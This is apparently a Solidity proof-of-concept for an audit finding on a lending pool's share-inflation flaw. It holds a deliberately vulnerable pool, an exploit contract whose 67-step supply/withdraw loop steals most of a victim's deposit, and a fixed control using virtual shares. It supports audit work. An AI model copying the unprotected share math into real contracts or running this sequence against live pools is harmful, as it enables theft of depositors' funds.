// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Liquorice — MixBytes, finding 49433 (report 21 Feb 2025)
    borrow() increases totalDeposits while totalSupply stays put, leaving
    1 share backed by 2 underlying. supply then mints
    amount * totalSupply / totalDeposits with no virtual offset.
    Sixty-seven deposit/withdraw steps, the count in the report, push the
    rate to 147573952589676412929. A 293 ether deposit mints 1 share.
    The attacker withdraws 220.286 ether against 147.574 ether of their own
    liquidity and keeps 72.713 ether of the victim's deposit.
    The control adds the report's 1000 wei virtual shares. The same sequence
    gives the victim about 290.17 shares and the attacker no profit.
*/

contract Dai {
    string public symbol = "DAI";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract LendingPool {
    Dai public dai;
    uint256 public totalDeposits;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    uint256 public immutable virtualShares;

    constructor(Dai _dai, uint256 _virtualShares) {
        dai = _dai;
        virtualShares = _virtualShares;
    }

    function supply(uint256 amount) external returns (uint256 shares) {
        require(dai.transferFrom(msg.sender, address(this), amount), "pull");
        if (totalSupply == 0) {
            shares = amount;
        } else if (virtualShares == 0) {
            // @> VULN: shares round down against totalDeposits / totalSupply with no virtual offset
            shares = amount * totalSupply / totalDeposits;
        } else {
            shares = amount * (totalSupply + virtualShares) / (totalDeposits + virtualShares);
        }
        totalSupply += shares;
        totalDeposits += amount;
        balanceOf[msg.sender] += shares;
    }

    function borrow(uint256 amount) external {
        require(dai.transferFrom(msg.sender, address(this), amount), "pull");
        totalDeposits += amount;
    }

    function withdraw(uint256 amount) external returns (uint256 shares) {
        uint256 supplyCache = totalSupply;
        uint256 depositsCache = totalDeposits;
        if (virtualShares == 0) {
            shares = (amount * supplyCache + depositsCache - 1) / depositsCache;
        } else {
            shares = (amount * (supplyCache + virtualShares) + depositsCache + virtualShares - 1)
                / (depositsCache + virtualShares);
        }
        balanceOf[msg.sender] -= shares;
        totalSupply = supplyCache - shares;
        totalDeposits = depositsCache - amount;
        require(dai.transfer(msg.sender, amount), "pay");
    }

    function withdrawAll() external returns (uint256 assets) {
        uint256 shares = balanceOf[msg.sender];
        assets = shares * totalDeposits / totalSupply;
        balanceOf[msg.sender] = 0;
        totalSupply -= shares;
        totalDeposits -= assets;
        require(dai.transfer(msg.sender, assets), "pay");
    }
}

contract Victim {
    function deposit(LendingPool pool, Dai dai, uint256 amount) external {
        dai.approve(address(pool), amount);
        pool.supply(amount);
    }
}

contract Exploit {
    uint256 public constant STEPS = 67;
    uint256 public constant VICTIM_DEPOSIT = 293 ether;
    uint256 public constant RATE = 147573952589676412929;
    uint256 public constant PROFIT = 72713023705161793535;

    Dai public dai;
    LendingPool public pool;
    Victim public victim;
    uint256 public profit;
    uint256 public victimShares;
    uint256 public rate;

    constructor() {
        dai = new Dai();
        pool = new LendingPool(dai, 0);
        victim = new Victim();
        dai.mint(address(this), 300 ether);
        dai.mint(address(victim), VICTIM_DEPOSIT);
        dai.approve(address(pool), type(uint256).max);
    }

    function run() external {
        uint256 start = dai.balanceOf(address(this));
        pool.supply(1);
        pool.borrow(1);
        for (uint256 i = 0; i < STEPS; ++i) {
            uint256 oldDeposits = pool.totalDeposits();
            pool.supply(2 * oldDeposits - 1);
            pool.withdraw(oldDeposits);
        }
        rate = pool.totalDeposits();
        uint256 attackerShares = pool.balanceOf(address(this));
        victim.deposit(pool, dai, VICTIM_DEPOSIT);
        victimShares = pool.balanceOf(address(victim));
        uint256 assets = pool.withdrawAll();
        profit = dai.balanceOf(address(this)) - start;
        require(attackerShares == 1, "share");
        require(rate == RATE, "rate");
        require(victimShares == 1, "victim");
        require(assets == (RATE + VICTIM_DEPOSIT) / 2, "assets");
        require(profit == PROFIT, "profit");
        require(dai.balanceOf(address(victim)) == 0, "victim spent");
    }
}

contract ExploitFixed {
    uint256 public constant STEPS = 67;
    uint256 public constant VICTIM_DEPOSIT = 293 ether;

    Dai public dai;
    LendingPool public pool;
    Victim public victim;

    constructor() {
        dai = new Dai();
        pool = new LendingPool(dai, 1000);
        victim = new Victim();
        dai.mint(address(this), 300 ether);
        dai.mint(address(victim), VICTIM_DEPOSIT);
        dai.approve(address(pool), type(uint256).max);
    }

    function run() external returns (uint256 victimShares, uint256 endBalance) {
        pool.supply(1);
        pool.borrow(1);
        for (uint256 i = 0; i < STEPS; ++i) {
            uint256 oldDeposits = pool.totalDeposits();
            pool.supply(2 * oldDeposits - 1);
            pool.withdraw(oldDeposits);
        }
        victim.deposit(pool, dai, VICTIM_DEPOSIT);
        victimShares = pool.balanceOf(address(victim));
        pool.withdrawAll();
        endBalance = dai.balanceOf(address(this));
    }
}
